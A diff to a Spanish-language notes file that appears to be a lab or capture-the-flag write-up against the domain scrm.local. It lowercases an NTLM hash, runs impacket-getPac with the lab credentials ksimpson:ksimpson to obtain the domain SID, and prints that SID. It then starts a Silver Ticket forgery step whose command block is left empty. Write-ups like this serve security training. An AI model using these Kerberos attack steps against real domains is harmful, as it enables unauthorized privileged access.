@@ -190,15 +190,24 @@ Lo pasaremos a minúsculas para que no nos de ningún error
 ```shell
 echo "B999A16500B87D17EC7F2E2A68778F05" | tr '[A-Z]' '[a-z]'
 ```
+
 ```ad-info
 b999a16500b87d17ec7f2e2a68778f05
 ```
 
 
 Segundo obtendremos el SID del dominio usando la [[IMPACKET]]
+```shell
+impacket-getPac scrm.local/ksimpson:ksimpson -targetUser Administrator
+```
 
+Obteniendo el Domain SID
+```ad-info
+S-1-5-21-2743207045-1827831105-2542523200
+```
 
+Usaremos la herramienta [[IMPACKET]] para obtener el *Silver Ticket*
+```shell
 
-
-Usaremos la herramienta [[IMPACKET]]
+```
 
